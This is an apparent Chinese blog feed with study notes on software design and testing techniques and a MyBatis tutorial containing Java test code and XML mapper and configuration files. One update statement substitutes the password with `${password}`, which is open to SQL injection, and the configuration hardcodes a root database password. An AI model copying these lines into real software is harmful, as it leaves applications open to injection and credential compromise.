id="1、详细设计阶段——根本目标：确定应该怎样具体实现所需求的系统"><a href="#1、详细设计阶段——根本目标：确定应该怎样具体实现所需求的系统" class="headerlink" title="1、详细设计阶段——根本目标：确定应该怎样具体实现所需求的系统"></a>1、详细设计阶段——根本目标：确定应该怎样具体实现所需求的系统</h3><h3 id="2、结构化程序设计的经典定义"><a href="#2、结构化程序设计的经典定义" class="headerlink" title="2、结构化程序设计的经典定义"></a>2、结构化程序设计的经典定义</h3><p>如果一个程序的代码块仅仅通过顺序、选择和循环这三种控制结构进行连接，并且每个代码块只有一个入口和一个出口，则称这个程序是结构化的</p><h3 id="3、三种基本的控制结构"><a href="#3、三种基本的控制结构" class="headerlink" title="3、三种基本的控制结构"></a>3、三种基本的控制结构</h3><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps705B.tmp.jpg" alt="img"> </p><p>4、结构化程序设计的主要原则</p><p>Ÿ 使用语言中的顺序、选择、重复等有限的基本控制结构表示程序逻辑</p><p>Ÿ 复杂结构应该用基本控制结构进行组合嵌套来实现</p><p>Ÿ 选用的控制结构只准许有一个入口和一个出口</p><p>Ÿ 严格控制GOTO语句，仅在下列情形才可使用：</p><p>1、若不使用GOTO语句就会使程序功能模糊</p><p>2、在某种可以改善而不是损害程序可读性的情况下。</p><p>5、程序流程图</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps705C.tmp.jpg" alt="img"><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps705D.tmp.jpg" alt="img"> </p><p>缺点：过早注重细节、过于详细、随意转换控制、不易表示数据结构</p><p>6、盒图</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps705E.tmp.jpg" alt="img"> </p><p>特点</p><p>Ÿ 功能域明确</p><p>Ÿ 不能任意转换控制</p><p>Ÿ 容易确定变量的作用域</p><p>Ÿ 容易表现嵌套关系及模块的层次结构</p><p>7、判定表</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps705F.tmp.jpg" alt="img"> </p><p>特点</p><p>Ÿ 能够简洁无歧义地描述复杂处理规则</p><p>Ÿ 可以校验和化简</p><p>Ÿ 无法通程序结构直接关联</p><p>8、判定树</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps7060.tmp.jpg" alt="img"> </p><p>9、程序设计语言</p><p>Ÿ PDL也称为伪码，它是用正文形式表示数据和处理过程的设计工具</p><p>Ÿ PDL具有严格的关键字外部语法，用于定义控制结构和数据结构</p><p>Ÿ PDL是一种“混杂”语言，它使用一种语言（通常是某种自然语言）的词汇，同时却使用另一种语言的语法（某种结构化的程序设计语言）</p><p>PDL特点</p><p>Ÿ 容易与程序注释结合，容易编辑</p><p>Ÿ 可以定义数据结构</p><p>Ÿ 机器可以识别，能自动生产程序框架</p><p>Ÿ 缺乏直观性</p><h2 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h2><h3 id="1、测试用例"><a href="#1、测试用例" class="headerlink" title="1、测试用例"></a>1、测试用例</h3><p>测试数据和预期的输出结果称为测试用例</p><p>Ÿ 具体的测试目的（例如，要测试的具体功能）</p><p>Ÿ 应该输入的测试数据</p><p>Ÿ 预期的输出结果</p><h3 id="2、黑盒测试和白盒测试"><a href="#2、黑盒测试和白盒测试" class="headerlink" title="2、黑盒测试和白盒测试"></a>2、黑盒测试和白盒测试</h3><p>Ÿ 黑盒测试法把程序看成一个黑盒子，完全不考虑程序的内部结构和处理过程，黑盒测试又称为<strong>功能测试</strong></p><p>Ÿ 白盒测试法的前提是可以把程序看成装在一个透明的白盒子里，也就是完全了解程序的结构和处理过程，白盒测试又称为<strong>结构测试</strong></p><h3 id="3、相关概念"><a href="#3、相关概念" class="headerlink" title="3、相关概念"></a>3、相关概念</h3><p>逻辑覆盖：</p><p>逻辑覆盖是设计白盒测试方案的一种技术；这组测试过程逐渐进行越来越完成的通路测试；选用少量“最有效的”测试数据；尽可能完备的测试</p><p>语句覆盖：</p><p>选择足够多的测试数据，使被测程序中每个语句至少执行一次</p><p>判定覆盖（分支覆盖）：</p><p>不仅每个语句必须至少执行一次；而且每各判定的每种可能的结果都应该至少执行一次，也就是每个判定的每个分支都至少执行一次</p><p>其他逻辑覆盖</p><p>条件覆盖：不仅每个语句至少执行一次，而且使判定表达式中的每个条件都去到各种可能的结果</p><p>判定/条件覆盖：选取足够多的测试数据，使得判定表达式中的每个条件都取到各种可能的值，而且每个判定表达式也都取到各种可能的结果</p><h3 id="4、McCabe方法——流图"><a href="#4、McCabe方法——流图" class="headerlink" title="4、McCabe方法——流图"></a>4、McCabe方法——流图</h3><p>McCabe方法根据程序控制流的复杂程度定量度量程序的复杂程度，度量出的结果称为程序的<strong>环形复杂程度</strong></p><p>为了突出表示程序的控制流，人们通常使用<strong>流图</strong>（也称为程序图）</p><p>实质——“退化了的”程序流程图</p><p>Ÿ 仅仅描绘程序的控制流程</p><p>Ÿ 不表现对数据的具体操作</p><p>Ÿ 不表现分支或循环的具体条件</p><h3 id="5、流图"><a href="#5、流图" class="headerlink" title="5、流图"></a>5、流图</h3><p><strong>节点：</strong></p><p>在流图中用圆表示，一个圆代表一条或多条无分支语句</p><p><strong>边：</strong></p><p>流图中的箭头线，和程序流程图中的箭头线类似，代表控制流</p><p>在流图中一条边必须终止于一个节点，即使这个节点并不代表认识语句（实际上相当于一个空语句）</p><p><strong>区域：</strong></p><p>由边和节点围成的面积，当计算区域数时应该包括图外部未被包围起来的那个区域</p><h3 id="6、环形复杂度"><a href="#6、环形复杂度" class="headerlink" title="6、环形复杂度"></a>6、环形复杂度</h3><p>环形复杂度定量度量程序的逻辑复杂性</p><p>Ÿ V(G)=E-N+2，其中E是流图中边的条数，N是流图中节点数。</p><p>Ÿ V(G)=P+1，其中P是流图中判定节点的数目。</p><h3 id="7、基本路径测试"><a href="#7、基本路径测试" class="headerlink" title="7、基本路径测试"></a>7、基本路径测试</h3><p>概念</p><p>以流图的环形复杂度为指南定义执行路径的基本集合，从该基本集合导出的测试用例可以保证程序中的每条语句至少执行一次，而且每个条件在执行时都将分别取true和false值。</p><p>步骤</p><p>①根据过程设计结果画出相应的流图</p><p>②计算流图的环形复杂度</p><p>③确定线性独立路径的基本集合</p><p>a、程序的环形复杂度决定了程序中独立路径的数量</p><p>b、独立路径至少包含一条在定义该路径之前不曾用过的边</p><p>④设计可强制执行基本集合中每条路径的测试用例</p><p>黑盒测试</p><p>1测试</p><p>1.1测试用例的重要性——设计良好的测试用例是关键</p><p>①降低软件测试成本</p><p>②保证测试工作质量</p><p>③评估和检验测试效果</p><p>1.2测试用例的概念</p><p>Ÿ 测试用例值：完成被测软件的某个执行所需的输入值</p><p>Ÿ 期望结果：当且仅当程序满足其期望行为，执行测试时产生的结果</p><p>Ÿ 前缀值：将软件置于合适的状态来接受测试用例值的任何必要的输入</p><p>Ÿ 后缀值：测试用例值被发送以后，需要被发送到软件的任何输入</p><p>测试集——测试用例值的集合</p><p>验证值——查看测试用例值结果所要用到的值</p><p>结束命令——终止程序或返回到稳定状态所要用到的值</p><p>Eg.</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps9CD3.tmp.jpg" alt="img"> </p><p>1.3测试用例设计的要求</p><p>①具有代表性和典型性</p><p>②寻求系统设计和功能设计的弱点</p><p>③既有正确输入也有错误或异常输入</p><p>④考虑用户交际的诸多场景</p><h2 id="黑盒测试技术"><a href="#黑盒测试技术" class="headerlink" title="黑盒测试技术"></a>黑盒测试技术</h2><h3 id="2-1-概念"><a href="#2-1-概念" class="headerlink" title="2.1 概念"></a>2.1 概念</h3><p>黑盒测试时将测试对象看作一个黑盒子，完全不考虑程序内部的逻辑结构和内部特性，只依据程序的需求规格说明书，检查程序的功能是否符合它的功能说明。</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps9CD4.tmp.jpg" alt="img"> </p><h3 id="2-2等价类划分"><a href="#2-2等价类划分" class="headerlink" title="2.2等价类划分"></a>2.2等价类划分</h3><p>2.2.1概念</p><p>等价类划分是将输入域划分成尽可能少的若干子域，在划分中要求每个子域两两互不相交，每个子域称为一个等价类。</p><p>注：同一输入域的等价类划分可能不唯一；只需从每一个等价类中选取一个输入作为测试用例；对于相同的等价类划分，不同测试人员选取的测试用例集可能是不同的</p><p>2.2.2等价类类型</p><p>Ÿ <strong>有效等价类</strong>是对规格说明有意义、合理的输入数据构成的集合，能够检验程序是否实现了规格说明中预先规定的功能和性能。</p><p>Ÿ <strong>无效等价类</strong>是对规格说明无意义、不合理的输入数据构成的集合，以检查程序是否具有一定的容错性。</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps9CD5.tmp.jpg" alt="img"> </p><p>2.2.3变量的等价类</p><p><strong>取值范围</strong>：在输入条件规定了取值范围的情况下，可以确定一个有效等价类和两个无效等价类。</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps9CD6.tmp.jpg" alt="img"> </p><p><strong>字符串</strong>：在规定了输入数据必须遵守的规则情况下，可确定一个有效等价类（符合规则）和若干个无效等价类（从不同角度违反规则）</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps9CD7.tmp.jpg" alt="img"> </p><p><strong>枚举</strong>：若规定输入数据是一组值（假定N个），并且程序要对每一个输入值分别处理，可确定N个有效等价类和一个无效等价类</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps9CD8.tmp.jpg" alt="img"> </p><p><strong>数组</strong>：数组是一组具有相同类型的元素的集合，数组长度及其类型都可以作为等价类划分的依据。</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps9CD9.tmp.jpg" alt="img"> </p><p><strong>复合数据类型</strong>：符合数据类型是包含两个或两个以上相互独立的属性的输入数据，在进行等价类划分时需要考虑输入数据的每个属性的合法和非法属性。</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps9CDA.tmp.jpg" alt="img"> </p><p><strong>测试用例生成</strong>：测试对象通常有多个输入参数，如何对这些参数等价类进行组合测试，来保证等价类的覆盖率，是测试用例设计首先需要考虑的问题。</p><p>Ÿ 所有有效等价类的代表值都集成到测试用例中，即覆盖有效等价类的所有组合。任何一个组合都将设计成一个有效的测试用例，也称<strong>正面测试用例</strong>。</p><p>Ÿ 无效等价类的代表值只能和其他有效等价类的代表值（随意）进行组合。因此，每个无效等价类都将产生一个额外的无效测试用例，也称<strong>负面测试用例</strong>。</p><h3 id="2-3边界值分析"><a href="#2-3边界值分析" class="headerlink" title="2.3边界值分析"></a>2.3边界值分析</h3><p>2.3.1概念</p><p><strong>边界值分析</strong>是对输入或输出的边界值进行测试的一种方法，它通常作为等价类划分的补充，这种情况下的测试用例来自等价类的边界</p><p>Ÿ 先确定边界：通常输入或输出等价类的边界就是应该着重测试的边界情况</p><p>Ÿ 选取正好等于、刚刚大于或刚刚小于边界的值作为测试数据，而不是选取等价类中的典型值或任意值</p><p>实践表明：大多数故障往往发生在输入定义域或输出值域的边界上，而不是内部。因此，针对各种边界情况测试用例，通常会取得很好的测试效果。</p><p>2.3.2基本思想</p><p>故障往往出现在程序输入变量的边界值附近</p><p>边界值分析法是基于可靠性理论中称为<strong>“单故障”</strong>的假设，即有两个或两个以上故障同时出现而导致失效的情况很少。</p><p>对程序中的每个变量重复：每次保留一个变量，让其余的变量取正常值，被保留的变量依次取min、min+、nom、max-和max+。</p><p>3健壮性测试</p><p><strong>健壮性测试</strong>是作为边界值分析的一个简单的扩充，它除了对变量的5个边界值分析取指外，还要增加一个略大于最大值（max+）以及略小于最小值（min-）的取值，检查超过极限值时系统的情况。</p><p>4错误推测法</p><p><strong>错误推测法</strong>是人们根据经验或直觉推测程序中可能存在的各种错误，从而有针对性地编写检查这些错误的测试用例的方法。</p><p>Ÿ 软件缺陷具有空间聚集性，80%的缺陷常常存在于20%的代码中。因此，应当记住常常光临代码的高危多发“地段”，这样发现缺陷的可能性会大得多。</p><p>Ÿ 列举程序中所有可能的错误和容易发生错误的特殊情况，根据可能出现的错误情况选择测试用例。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;软件工程&quot;&gt;&lt;a href=&quot;#软件工程&quot; class=&quot;headerlink&quot; title=&quot;软件工程&quot;&gt;&lt;/a&gt;软件工程&lt;/h1&gt;&lt;p&gt;声明：该笔记内容来自清华大学软件工程&lt;a href=&quot;https://www.xuetangx.com/course/THU</summary>
      
    
    
    
    <category term="知识积累" scheme="https://a2914475618.github.io/categories/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"/>
    
    
    <category term="软件工程" scheme="https://a2914475618.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Mybatis</title>
    <link href="https://a2914475618.github.io/2021/09/27/Mybatis/"/>
    <id>https://a2914475618.github.io/2021/09/27/Mybatis/</id>
    <published>2021-09-27T01:29:28.000Z</published>
    <updated>2021-10-07T07:40:42.650Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h1><h2 id="三层架构"><a href="#三层架构" class="headerlink" title="三层架构"></a>三层架构</h2><blockquote><p>界面层： 和用户打交道的， 接收用户的请求参数， 显示处理结果的。（jsp ，html ，servlet）<br>业务逻辑层： 接收了界面层传递的数据，计算逻辑，调用数据库，获取数据<br>数据访问层： 就是访问数据库， 执行对数据的查询，修改，删除等等的。</p><p>三层对应的包<br>    界面层： controller包 （servlet）<br>    业务逻辑层： service 包（XXXService类）<br>    数据访问层： dao包（XXXDao类）</p><p>   三层中类的交互<br>    用户使用界面层–&gt; 业务逻辑层—&gt;数据访问层（持久层）–&gt;数据库（mysql）</p><p>   三层对应的处理框架<br>    界面层—servlet—springmvc（框架）<br>    业务逻辑层—service类–spring（框架）<br>    数据访问层—dao类–mybatis（框架）</p></blockquote><h2 id="基础简介"><a href="#基础简介" class="headerlink" title="基础简介"></a>基础简介</h2><blockquote><p> mybatis框架<br>  一个框架，早期叫做ibatis, 代码在github。<br>  mybatis是 MyBatis SQL Mapper Framework for Java （sql映射框架）<br>  1）sql mapper :sql映射<br>     可以把数据库表中的一行数据 映射为 一个java对象。<br>   一行数据可以看做是一个java对象。操作这个对象，就相当于操作表中的数据</p><p>  2） Data Access Objects（DAOs） : 数据访问 ， 对数据库执行增删改查。</p></blockquote><p> mybatis提供了哪些功能：</p><blockquote><ol><li>提供了创建Connection ,Statement, ResultSet的能力 ，不用开发人员创建这些对象了</li><li>提供了执行sql语句的能力， 不用你执行sql</li><li>提供了循环sql， 把sql的结果转为java对象， List集合的能力<br>  while (rs.next()) {<br>Student stu = new Student();<br>stu.setId(rs.getInt(“id”));<br>stu.setName(rs.getString(“name”));<br>stu.setAge(rs.getInt(“age”));<br>//从数据库取出数据转为 Student 对象，封装到 List 集合<br>stuList.add(stu);<br>  }<br>   4.提供了关闭资源的能力，不用你关闭Connection, Statement, ResultSet</li></ol><p> 开发人员做的是： 提供sql语句<br> 最后是： 开发人员提供sql语句–mybatis处理sql—开发人员得到List集合或java对象（表中的数据）</p></blockquote><p> 总结：<br> mybatis是一个sql映射框架，提供的数据库的操作能力。增强的JDBC,使用mybatis让开发人员集中精神写sql就可以了，不必关心Connection,Statement,ResultSet的创建，销毁，sql的执行。 </p><h2 id="约束文件"><a href="#约束文件" class="headerlink" title="约束文件"></a>约束文件</h2><p>核心配置文件的约束</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>映射文件的约束</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="开发步骤"><a href="#开发步骤" class="headerlink" title="开发步骤"></a>开发步骤</h2><blockquote><ol><li>添加Mybatis的坐标</li><li>创建user数据表</li><li>编写User实体类</li><li>编写映射文件UserMapper.xml</li><li>编写核心文件sqlMapConfig.xml</li><li>编写测试类</li></ol></blockquote><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><blockquote><ol><li><p>mybatis执行更新操作时  要提交事务  </p><p>sqlSession.commit();</p></li></ol></blockquote><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lusir.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.lusir.dao.UserImpl;</span><br><span class="line"><span class="keyword">import</span> com.lusir.domin.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.io.Resources;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lusir</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/27 - 10:20</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBatisTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//获得核心配置文件</span></span><br><span class="line">        InputStream is= Resources.getResourceAsStream(<span class="string">&quot;sqlMapperConfig.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//获得Session工厂对象</span></span><br><span class="line">        SqlSessionFactory sqlSessionFactory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(is);</span><br><span class="line">        <span class="comment">//获得session回话对象</span></span><br><span class="line">        SqlSession sqlSession = sqlSessionFactory.openSession();</span><br><span class="line">        <span class="comment">//执行相关操作</span></span><br><span class="line">        List&lt;User&gt; userList = sqlSession.selectList(<span class="string">&quot;userMapper.findAll&quot;</span>);</span><br><span class="line">        System.out.println(userList);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="常用CEUD映射配置"><a href="#常用CEUD映射配置" class="headerlink" title="常用CEUD映射配置"></a>常用CEUD映射配置</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;userMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--查询操作--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.lusir.domin.User&quot;</span>&gt;</span></span><br><span class="line">        select * from  user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--增加操作--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;save&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.lusir.domin.User&quot;</span>&gt;</span></span><br><span class="line">        insert into user values (#&#123;id&#125;,#&#123;username&#125;,#&#123;password&#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--修改操作--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;update&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.lusir.domin.User&quot;</span>&gt;</span></span><br><span class="line">        update user</span><br><span class="line">        set  username=#&#123;username&#125;,password=$&#123;password&#125;</span><br><span class="line">        where id=#&#123;id&#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--删除操作--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;delete&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;java.lang.Integer&quot;</span>&gt;</span></span><br><span class="line">        delete  from  user where id=#&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="核心数据库环境配置"><a href="#核心数据库环境配置" class="headerlink" title="核心数据库环境配置"></a>核心数据库环境配置</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">transactionManager</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql:///db1?serverTimezone=UTC&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;com.lusir.mapper/UserMapper.xml&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="相关标签"><a href="#相关标签" class="headerlink" title="相关标签"></a>相关标签</h3><blockquote><p>environment标签</p><ol><li>transactionManager<ol><li>JDBC  使用JDBC的提交和回滚设置 依赖从数据源得到的连接来管理事务作用域</li><li>MANAGED 什么也不做</li></ol></li><li>dataSource<ol><li> POOLED 使用连接池</li><li>UNPOOLED  不使用连接池  每次请求时打开和关闭连接</li><li>JNDI</li></ol></li></ol><p>mapper标签   加载映射配置文件</p><ol><li>resource</li><li>url</li><li>class</li><li>package  扫包  将包内的映射器接口实现全部注册为映射器</li></ol><p>properties标签</p><p>可以将数据源的信息单独抽取成一个properties文件，可以额外配置的propertis文件</p><p>typeAliases标签</p><p>在核心配置文件中定义别名，可以在resultType 和paramsType 中使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">typeAlias</span> <span class="attr">type</span>=<span class="string">&quot;com.lusir.domin.User&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;user&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">typeAlias</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="DAO层通过代理来创建对象"><a href="#DAO层通过代理来创建对象" class="headerlink" title="DAO层通过代理来创建对象"></a>DAO层通过代理来创建对象</h3><p>必须满足规范：</p><ol><li>映射文件中的命名空间必须为对应接口的全类名</li><li>映射文件中的resultType必须与接口中对应方法返回类型相同，paramType同上</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; 